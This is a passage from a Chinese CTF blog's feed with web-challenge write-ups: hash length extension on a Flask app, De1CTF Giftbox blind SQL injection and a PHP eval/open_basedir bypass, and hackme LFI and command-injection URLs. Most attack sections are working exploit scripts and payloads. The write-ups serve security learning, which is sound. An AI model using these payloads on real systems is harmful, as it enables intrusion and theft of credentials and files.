class="line">sys.setdefaultencoding(<span class="string">'latin1'</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, action, param, sign, ip)</span>:</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)):          <span class="comment">#SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Exec</span><span class="params">(self)</span>:</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"scan"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'w'</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">"Connection Timeout"</span>):</span><br><span class="line">                    result[<span class="string">'data'</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">print</span> resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"read"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'r'</span>)</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">'data'</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">'code'</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">'data'</span>] = <span class="string">"Action Error"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">'msg'</span>] = <span class="string">"Sign Error"</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkSign</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="comment">#generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route("/geneSign", methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span><span class="params">()</span>:</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    action = <span class="string">"scan"</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"><span class="meta">@app.route('/De1ta',methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span><span class="params">()</span>:</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">"action"</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">"sign"</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"No Hacker!!!!"</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">"code.txt"</span>,<span class="string">"r"</span>).read()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(param)</span>:</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Connection Timeout"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span><span class="params">(action, param)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(content)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span><span class="params">(param)</span>:</span></span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">"gopher"</span>) <span class="keyword">or</span> check.startswith(<span class="string">"file"</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>)</span><br></pre></td></tr></table></div></figure><p>题目很明显是在考察哈希长度扩展攻击，但是在读文件的时候过滤了gopher和file协议，不过找到一篇<span class="exturl"><a class="exturl__link" href="http://13.58.107.157/archives/8936" target="_blank" rel="noopener">文章(http://13.58.107.157/archives/8936)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>说可以使用<code>local_file</code>协议，该协议是linux下支持的一个协议，也可以实现读文件<br><img src="/2020/09/14/buuctf1/5.png" alt><br>流程如下：<br>先访问geneSign页面生成签名，这里要把我们的参数设定好，由于提示已经给出了flag位置，所以通过<code>local_file:flag.txt</code>即可读到flag<br>在生成签名之后，用hashpump生成即可<br><img src="/2020/09/14/buuctf1/6.png" alt></p><blockquote><p>PS: <code>input sig</code> 填写我们获得的签名，<code>input data</code>填写之前生成签名的明文<strong>最后</strong>几位字符，<code>input key len</code>填写明文总长度减去input data长度后的值，最后填写我们要添加的值。</p></blockquote><p>将结果中的<code>\x</code>替换为<code>%</code>后按照要求提交即可，exp如下(cookie要在headers中提交，否则会报错)：<br><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://e78b915e-84fa-4293-a7eb-51e747ff6e43.node3.buuoj.cn/'</span></span><br><span class="line">sig = requests.get(url+<span class="string">'geneSign?param=local_file:flag.txt'</span>).content.decode(<span class="string">'utf-8'</span>)</span><br><span class="line">print(sig)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用hashpump生成替换值</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">"Cookie"</span>: </span><br><span class="line">    <span class="string">r"action=scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%008%01%00%00%00%00%00%00read; sign=a21ff75fdafd472a4e5abda397747fa0"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">flag = requests.get(url+<span class="string">'De1ta?param=local_file:flag.txt'</span>,headers=headers).content.decode(<span class="string">'utf-8'</span>)</span><br><span class="line">print(json.loads(flag)[<span class="string">'data'</span>])</span><br></pre></td></tr></table></div></figure></p>        <h1 id="De1CTF-2019-Giftbox">          <a href="#De1CTF-2019-Giftbox" class="heading-link"><i class="fas fa-link"></i></a>[De1CTF 2019]Giftbox</h1>      <p>这题出的挺不错的，虽然整体考点并不难，但是却很考验综合能力，题目给出了源码（看了大佬wp才知道，原题是没有给源码的）<br>首先得说师傅这前端做的真是漂亮，佩服。题目给了一个模拟shell，可以执行简单的命令，简单<code>usage.md</code>可以看到一些主要命令，但是需要登录<br><img src="/2020/09/14/buuctf1/7.png" alt><br>登录界面进行测试发现存在注入，没有任何过滤，不过由于输入空格会被当做命令分隔符，所以需要用注释符来绕过空格，查看浏览记录发现每次请求时需要输入totp值，查看js代码发现这是Google的一个一次性身份验证算法，查看<code>main.js</code>有一段注释信息，基本给出了totp算法的各项参数<br><figure class="highlight javascript"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">[Developer Notes]</span></span><br><span class="line"><span class="comment">OTP Library for Python located in js/pyotp.zip</span></span><br><span class="line"><span class="comment">Server Params:</span></span><br><span class="line"><span class="comment">digits = 8</span></span><br><span class="line"><span class="comment">interval = 5</span></span><br><span class="line"><span class="comment">window = 1</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></div></figure><br>python下正好就有相应库，那么编写盲注脚本：<br><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> pyotp</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"></span><br><span class="line">sec = <span class="string">'GAXG24JTMZXGKZBU'</span></span><br><span class="line">totp = pyotp.TOTP(sec, digits=<span class="number">8</span>, interval=<span class="number">5</span>)</span><br><span class="line">url = <span class="string">'http://25835784-3899-453c-bc84-1e65288ad808.node3.buuoj.cn/shell.php'</span></span><br><span class="line">password = <span class="string">''</span></span><br><span class="line">payload_pre = <span class="string">"?totp=&#123;&#125;&amp;a="</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">60</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">34</span>, <span class="number">127</span>):</span><br><span class="line">        tmp = parse.quote(<span class="string">"login ad'/**/or/**/ascii(substr((select/**/password/**/from/**/users/**/where/**/username='admin'),&#123;&#125;,1))=&#123;&#125;# pa"</span>.format(len(password)+<span class="number">1</span>, j))</span><br><span class="line">        res = requests.get(url+payload_pre.format(totp.now()) + tmp).content.decode(<span class="string">'utf-8'</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'password incorrect'</span> <span class="keyword">in</span> res:</span><br><span class="line">            password += chr(j)</span><br><span class="line">            print(password)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> j == <span class="number">127</span>:</span><br><span class="line">            print(<span class="string">'finished.'</span>)</span><br><span class="line">            exit()</span><br></pre></td></tr></table></div></figure><br>得到密码<code>hint{G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333}</code>，密码中给出了命令提示<code>sh0w_hiiintttt_23333</code>，尝试运行一下<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[de1ta@de1ta-mbp &#x2F;sandbox]% sh0w_hiiintttt_23333</span><br><span class="line">we add an evil monster named &#39;eval&#39; when launching missiles.</span><br></pre></td></tr></table></div></figure><br>那么基本就是命令执行了，登录之后，执行<code>targeting</code>命令设定参数，存在过滤<br><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkCode</span><span class="params">($code)</span></span>&#123;</span><br><span class="line">    $table=<span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line">    <span class="keyword">if</span> (strlen($code)&gt;<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'code too long.'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ($i=<span class="number">0</span>; $i&lt;strlen($code); $i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (strpos($table,$code[$i])===<span class="keyword">FALSE</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'bad code.'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (file_exists($sandbox.<span class="string">'missiles/'</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]).<span class="string">'/'</span>.$code))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'target existed.'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkPosition</span><span class="params">($position)</span></span>&#123;</span><br><span class="line">    $table=<span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#125;)$(&#123;_+-,.'</span>;</span><br><span class="line">    <span class="keyword">if</span> (strlen($position)&gt;<span class="number">12</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'position too long.'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ($i=<span class="number">0</span>; $i&lt;strlen($position); $i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (strpos($table,$position[$i])===<span class="keyword">FALSE</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'bad position.'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><br>在设定参数之后，如<code>targeting a b</code>，后台会把我们的处理为<code>$a=&quot;b&quot;</code>，然后带入eval中执行，由于使用了双引号包裹变量导致了漏洞，因为在PHP中，双引号包裹的变量会被PHP尝试解析<span class="exturl"><a class="exturl__link" href="https://www.php.net/manual/zh/language.types.string.php#language.types.string.parsing" target="_blank" rel="noopener">https://www.php.net/manual/zh/language.types.string.php#language.types.string.parsing</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>，利用此特性我们就可以进行函数执行，尝试执行phpinfo()，<code>targeting a ${phpinfo()}</code>，将返回页面保存到本地打开可以看到函数执行信息<br><img src="/2020/09/14/buuctf1/8.png" alt><br><img src="/2020/09/14/buuctf1/9.png" alt><br>可以看到题目设置了basedir，需要进行绕过，payload如下：<br><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">import</span> pyotp</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">sec = <span class="string">'GAXG24JTMZXGKZBU'</span></span><br><span class="line">totp = pyotp.TOTP(sec, digits=<span class="number">8</span>, interval=<span class="number">5</span>)</span><br><span class="line">session = requests.session()</span><br><span class="line">base_url = <span class="string">'http://25835784-3899-453c-bc84-1e65288ad808.node3.buuoj.cn/shell.php'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(sig)</span>:</span></span><br><span class="line">    url = base_url + <span class="string">'?a=&#123;&#125;&amp;totp=&#123;&#125;'</span></span><br><span class="line">    payload = parse.quote(<span class="string">'login admin hint&#123;G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333&#125;'</span>)</span><br><span class="line">    con = session.get(url.format(payload, sig)).text</span><br><span class="line">    print(con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">destruct</span><span class="params">(sig)</span>:</span></span><br><span class="line">    url = base_url + <span class="string">'?a=&#123;&#125;&amp;totp=&#123;&#125;'</span></span><br><span class="line">    payload = <span class="string">'destruct'</span></span><br><span class="line">    con = session.get(url.format(payload, sig)).text</span><br><span class="line">    print(con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">targeting</span><span class="params">(sig, payload)</span>:</span></span><br><span class="line">    url = base_url + <span class="string">'?a=&#123;&#125;&amp;totp=&#123;&#125;'</span></span><br><span class="line">    con = session.get(url.format(parse.quote(payload), sig)).text</span><br><span class="line">    print(con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">launch</span><span class="params">(sig)</span>:</span></span><br><span class="line">    url = base_url + <span class="string">'?a=&#123;&#125;&amp;totp=&#123;&#125;'</span></span><br><span class="line">    payload = <span class="string">'launch'</span></span><br><span class="line">    con = session.get(url.format(payload, sig)).text</span><br><span class="line">    flag =  re.findall(<span class="string">r'(flag\&#123;[a-z0-9\-]+\&#125;)'</span>,con)</span><br><span class="line">    <span class="keyword">if</span> flag:</span><br><span class="line">        print(flag[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(con)</span><br><span class="line">login(totp.now())</span><br><span class="line">destruct(totp.now())</span><br><span class="line"></span><br><span class="line"><span class="comment"># phpinfo()</span></span><br><span class="line"><span class="comment"># payloads = ['targeting a $&#123;phpinfo()&#125;']</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># scandir('/')</span></span><br><span class="line"><span class="comment"># payloads = ['targeting a chdir','targeting b img','targeting c &#123;$a($b)&#125;','targeting d ini_set','targeting e open_basedir',</span></span><br><span class="line"><span class="comment">#    'targeting f ..','targeting g &#123;$d($e,$f)&#125;','targeting h &#123;$a($f)&#125;','targeting i &#123;$a($f)&#125;','targeting j chr',</span></span><br><span class="line"><span class="comment">#    'targeting k &#123;$j(47)&#125;','targeting l &#123;$d($e,$k)&#125;','targeting m scandir','targeting n print_r','targeting o &#123;$n($m($k))&#125;']</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># file_get_contents('/flag')</span></span><br><span class="line">payloads = [<span class="string">'targeting a chdir'</span>,<span class="string">'targeting b img'</span>,<span class="string">'targeting c &#123;$a($b)&#125;'</span>,<span class="string">'targeting d ini_set'</span>,<span class="string">'targeting e open_basedir'</span>,</span><br><span class="line">    <span class="string">'targeting f ..'</span>,<span class="string">'targeting g &#123;$d($e,$f)&#125;'</span>,<span class="string">'targeting h &#123;$a($f)&#125;'</span>,<span class="string">'targeting i &#123;$a($f)&#125;'</span>,<span class="string">'targeting j chr'</span>,</span><br><span class="line">    <span class="string">'targeting k &#123;$j(47)&#125;'</span>,<span class="string">'targeting l &#123;$d($e,$k)&#125;'</span>,<span class="string">'targeting m flag'</span>,<span class="string">'targeting n $k$m'</span>,<span class="string">'targeting o file_get_'</span>,</span><br><span class="line">    <span class="string">'targeting p contents'</span>,<span class="string">'targeting q $o$p'</span>,<span class="string">'targeting r &#123;$q($n)&#125;'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> each <span class="keyword">in</span> payloads:</span><br><span class="line">    targeting(totp.now(), each)</span><br><span class="line">launch(totp.now())</span><br></pre></td></tr></table></div></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;[强网杯 2019]Upload&lt;/p&gt;
    
    </summary>
    
      <category term="复现" scheme="http://chaosec.top/categories/%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="CTF" scheme="http://chaosec.top/tags/CTF/"/>
    
      <category term="Web" scheme="http://chaosec.top/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>Rootme网站做题记录(三)</title>
    <link href="http://chaosec.top/2020/09/13/rootme2/"/>
    <id>http://chaosec.top/2020/09/13/rootme2/</id>
    <published>2020-09-13T14:41:21.000Z</published>
    <updated>2020-09-14T13:34:31.943Z</updated>
    
    <content type="html"><![CDATA[<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Password plz..." />    <label for="pass">Password plz...</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      The article has been encrypted, please enter your password to view.&lt;br&gt;
    
    </summary>
    
      <category term="writeup" scheme="http://chaosec.top/categories/writeup/"/>
    
    
      <category term="CTF" scheme="http://chaosec.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>hackme-web题解</title>
    <link href="http://chaosec.top/2020/09/13/hackme-1/"/>
    <id>http://chaosec.top/2020/09/13/hackme-1/</id>
    <published>2020-09-13T13:44:24.000Z</published>
    <updated>2020-09-13T13:44:24.084Z</updated>
    
    <content type="html"><![CDATA[<p>历史文章补发</p>        <h1 id="前言">          <a href="#前言" class="heading-link"><i class="fas fa-link"></i></a>前言</h1>      <p>最近rootme网站好像有点问题，所以刷点hackme网站的题目，网址<span class="exturl"><a class="exturl__link" href="https://hackme.inndy.tw/" target="_blank" rel="noopener">https://hackme.inndy.tw/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><a id="more"></a>        <h1 id="LFI">          <a href="#LFI" class="heading-link"><i class="fas fa-link"></i></a>LFI</h1>      <p>查看源代码</p><p><img src="/2020/09/13/hackme-1/1.png" alt></p><p>尝试读取</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;hackme.inndy.tw&#x2F;lfi&#x2F;?page&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;pages&#x2F;flag</span><br></pre></td></tr></table></div></figure><blockquote><p>Can you read the flag&lt;?php require(‘config.php’); ?&gt;?</p></blockquote><p>读取config即可得到flag</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;hackme.inndy.tw&#x2F;lfi&#x2F;?page&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;pages&#x2F;config</span><br></pre></td></tr></table></div></figure>        <h1 id="homepage">          <a href="#homepage" class="heading-link"><i class="fas fa-link"></i></a>homepage</h1>      <p>查看代码在结尾看到一个<code>cute.js</code>，跟踪一下，发现aaencode编码，丢在控制台执行即可得到二维码，扫描即可</p>        <h1 id="ping">          <a href="#ping" class="heading-link"><i class="fas fa-link"></i></a>ping</h1>      <p>命令执行，我们可以使用 <code>$()</code> 或者 <code><code> </code></code> 都可以实现执行命令的作用</p><figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://hackme.inndy.tw/ping/?ip=$(ls -a)</span><br></pre></td></tr></table></div></figure><p>然后访问flag.php文件，因为题目过滤flag和php关键字，还有cat等命令，我们可以尝试</p><figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://hackme.inndy.tw/ping/?ip=$(tac *.*)</span><br></pre></td></tr></table></div></figure>        <h1 id="scoreboard">          <a href="#scoreboard" class="heading-link"><i class="fas fa-link"></i></a>scoreboard</h1>      <p>f12查看点击网络，查看一下消息头即可看到flag</p>        <h1 id="login-as-admin-0">          <a href="#login-as-admin-0" class="heading-link"><i class="fas fa-link"></i></a>login as admin 0</h1>      <p>题目主要源码如下</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">'config.php'</span>);</span><br><span class="line"><span class="comment">// table schema</span></span><br><span class="line"><span class="comment">// user -&gt; id, user, password, is_admin</span></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'show_source'</span>] === <span class="string">'1'</span>) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_filter</span><span class="params">($str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $strl = strtolower($str);</span><br><span class="line">    <span class="keyword">if</span> (strstr($strl, <span class="string">'or 1=1'</span>) || strstr($strl, <span class="string">'drop'</span>) ||</span><br><span class="line">        strstr($strl, <span class="string">'update'</span>) || strstr($strl, <span class="string">'delete'</span>)</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">"'"</span>, <span class="string">"\\'"</span>, $str);</span><br><span class="line">&#125;</span><br><span class="line">$_POST = array_map(safe_filter, $_POST);</span><br><span class="line">$user = <span class="keyword">null</span>;</span><br><span class="line"><span class="comment">// connect to database</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">'name'</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">'password'</span>])) &#123;</span><br><span class="line">    $connection_string = sprintf(<span class="string">'mysql:host=%s;dbname=%s;charset=utf8mb4'</span>, DB_HOST, DB_NAME);</span><br><span class="line">    $db = <span class="keyword">new</span> PDO($connection_string, DB_USER, 